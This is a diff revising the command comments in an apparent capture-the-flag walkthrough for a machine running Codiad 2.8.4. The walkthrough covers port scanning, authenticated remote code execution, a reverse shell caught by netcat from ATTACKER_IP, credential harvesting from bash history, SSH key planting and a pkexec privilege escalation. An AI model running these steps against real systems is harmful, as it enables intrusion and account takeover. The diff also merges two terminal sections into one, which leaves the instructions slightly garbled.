@@ -50,8 +50,8 @@ echo "TARGET_IP ide.thm" | sudo tee -a /etc/hosts
 
 ### Port Discovery
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan on the target IP.
+# Why here: identify all active services, including the hidden Codiad instance on port 62337.
 nmap -sS -p- --min-rate 5000 -n TARGET_IP
 ```
 
@@ -59,8 +59,8 @@ nmap -sS -p- --min-rate 5000 -n TARGET_IP
 
 ### Service Enumeration
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: perform service version detection and run default scripts.
+# Why here: fingerprint the FTP, SSH, and web services to identify potential vulnerabilities like anonymous FTP.
 nmap -sVC -p21,22,80,62337 TARGET_IP -oA service-scan
 ```
 
@@ -97,10 +97,10 @@ Also, please take care of the image file ;)
 ### Web Content Discovery — Port 62337
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force directories on the hidden Codiad port.
+# Why here: confirm the presence of the Codiad IDE and locate its login page.
 feroxbuster -u http://TARGET_IP:62337/ \
-  -w /usr/share/seclists/Discovery/Web-Content/big.txt
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 ```
 
 **Result:** Codiad 2.8.4 IDE is running on port 62337.
@@ -128,8 +128,8 @@ Login at `http://TARGET_IP:62337/`.
 
 **Step 1 — Obtain authenticated session cookie:**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: authenticate to Codiad and capture the session cookie.
+# Why here: obtain the necessary authorization to exploit the authenticated RCE in the search component.
 curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authenticate' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-raw 'username=john&password=password&theme=default&language=en' \
@@ -138,15 +138,15 @@ curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authen
 
 **Step 2 — Set up listener:**
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a netcat listener.
+# Why here: catch the incoming reverse shell from the Codiad exploit.
 nc -lvnp 4444
 ```
 
 **Step 3 — Execute the exploit:**
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: run the Codiad RCE exploit script.
+# Why here: leverage authenticated access to trigger a reverse shell on the target system.
 python3 49705.py http://TARGET_IP:62337 john password ATTACKER_IP 4444 linux
 ```
 
@@ -159,15 +159,15 @@ python3 49705.py http://TARGET_IP:62337 john password ATTACKER_IP 4444 linux
 ### Enumerate from www-data
 
 ```bash
+# What it does: check active users and file descriptors.
+# Why here: identify the primary user accounts on the system and map their login shells for potential targeting.
 id
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
 cat /etc/passwd | grep "bash"
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for common configuration files.
+# Why here: find credentials in .conf or .env files that might be used for horizontal or vertical movement.
 find / -name "*.conf" -o -name "config.php" 2>/dev/null | grep -E "config|.env"
-# What it does: filters text with the specified pattern.
-# Why here: extract the important clue from a large output.
+# What it does: audit internal network listeners.
+# Why here: identify services like MySQL that are only accessible locally and might be vulnerable to credential reuse.
 netstat -tulpn 2>/dev/null | grep LISTEN
 ```
 
@@ -175,15 +175,15 @@ netstat -tulpn 2>/dev/null | grep LISTEN
 
 Find files owned by `drac`:
 ```bash
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search the filesystem for files owned by the user 'drac'.
+# Why here: find the user's bash history or configuration files that might leak sensitive data.
 find / -user drac 2>/dev/null
 ```
 
 Read bash history:
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the target user's bash history.
+# Why here: recover accidentally typed credentials or identify common administrative tasks performed by the user.
 cat /home/drac/.bash_history
 ```
 
@@ -194,8 +194,8 @@ cat /home/drac/.bash_history
 ### SSH with Reused Credentials
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in via SSH as 'drac' using reused credentials.
+# Why here: upgrade from the www-data foothold to a full user shell on the host.
 ssh drac@TARGET_IP
 # Password: Th3dRaCULa1sR3aL
 ```
@@ -231,17 +231,17 @@ Root shell in Session 1
 
 ```bash
 # On attacker machine
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: generate a new SSH key pair.
+# Why here: create dedicated credentials for the pkexec exploit to avoid using existing personal keys.
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_drac
 
 # On victim (as drac)
 mkdir -p /home/drac/.ssh
-# What it does: escribe una clave publica SSH en authorized_keys.
-# Why here: crear acceso SSH por clave para esa cuenta.
+# What it does: append the attacker's public key to the authorized_keys file.
+# Why here: enable passwordless SSH access to ensure stable dual-session persistence for the pkexec exploit.
 echo "<attacker public key>" > /home/drac/.ssh/authorized_keys
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: set strict permissions on the .ssh directory and authorized_keys file.
+# Why here: comply with SSH security requirements to allow key-based authentication.
 chmod 700 /home/drac/.ssh
 chmod 600 /home/drac/.ssh/authorized_keys
 ```
@@ -250,15 +250,9 @@ chmod 600 /home/drac/.ssh/authorized_keys
 
 **Terminal 1 (main session):**
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: establish the primary and secondary SSH sessions.
+# Why here: create the dual-session environment required for the pkttyagent/pkexec privilege escalation bypass.
 ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
-```
-
-**Terminal 2 (agent session):**
-```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
 ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 ```
 
@@ -266,8 +260,8 @@ ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 
 ```bash
 # Get the PID of session 1's sshd process
-# What it does: filters text with the specified pattern.
-# Why here: extract the important clue from a large output.
+# What it does: locate the process ID (PID) of the first SSH session.
+# Why here: provide the required process handle to pkttyagent for the authentication bypass.
 ps aux | grep sshd | grep drac | grep -v grep
 # Example output: root 12345 ... sshd: drac@pts/0
 
